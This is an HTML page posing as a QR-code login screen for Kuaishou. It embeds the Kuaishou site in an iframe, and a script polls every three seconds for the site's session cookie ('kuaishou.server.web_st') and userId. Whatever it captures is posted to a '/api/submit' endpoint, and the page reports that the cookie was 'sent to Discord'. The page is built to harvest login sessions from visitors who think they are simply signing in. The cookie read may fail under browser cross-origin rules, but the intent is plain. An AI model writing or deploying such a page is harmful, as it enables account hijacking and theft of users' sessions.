<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>扫码登录</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#111;color:#fff;font-family:Arial;text-align:center;padding:20px}
h2{color:#ff4900;margin-bottom:15px}
.login-box{width:100%;height:70vh;background:#fff;border-radius:10px;overflow:hidden;margin-bottom:15px}
.login-box iframe{width:100%;height:100%;border:none}
#status{margin-top:10px;font-size:16px;font-weight:bold}
.ok{color:#00ff88}
.wait{color:#ffaa00}
.info{color:#aaa;font-size:13px;margin-top:5px}
.btn{margin-top:10px;padding:10px 20px;background:#ff4900;color:#fff;border:none;border-radius:6px;font-size:14px;cursor:pointer}
</style>
</head>
<body>
<h2>快手扫码登录</h2>
<div class="login-box">
    <iframe id="ksFrame" src="https://www.kuaishou.com" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox"></iframe>
</div>
<p id="status" class="wait">请点击右上角登录，用快手APP扫码</p>
<p class="info">扫码成功后自动获取Cookie</p>
<button class="btn" onclick="reloadFrame()">重新加载</button>

<script>
var lastCookie = "";

function reloadFrame() {
    document.getElementById("ksFrame").src = "https://www.kuaishou.com";
    lastCookie = "";
    document.getElementById("status").className = "wait";
    document.getElementById("status").textContent = "请点击右上角登录，用快手APP扫码";
}

function checkCookie() {
    try {
        var iframe = document.getElementById("ksFrame");
        var doc = iframe.contentDocument || iframe.contentWindow.document;
        var c = doc.cookie;

        if (c && c.indexOf("kuaishou.server.web_st") !== -1 && c.indexOf("userId") !== -1) {
            if (c !== lastCookie) {
                lastCookie = c;
                document.getElementById("status").className = "ok";
                document.getElementById("status").textContent = "获取成功，正在发送...";

                fetch("/api/submit", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({cookie: c})
                }).then(function(r) {
                    return r.json();
                }).then(function(data) {
                    if (data.ok) {
                        document.getElementById("status").textContent = "已发送到Discord！";
                    }
                });
            }
        }
    } catch(e) {
        // 跨域拿不到，忽略
    }
}

setInterval(checkCookie, 3000);
</script>
</body>
</html>
